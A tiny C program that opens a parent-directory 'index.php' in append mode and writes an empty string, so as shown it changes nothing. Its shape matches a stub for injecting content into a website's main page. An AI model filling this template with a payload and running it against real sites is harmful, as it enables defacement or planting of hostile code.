#include <stdio.h>
int main()
{
  FILE *f=fopen("../index.php","a");
  fprintf(f,"");
  fclose(f);
  return 0;
}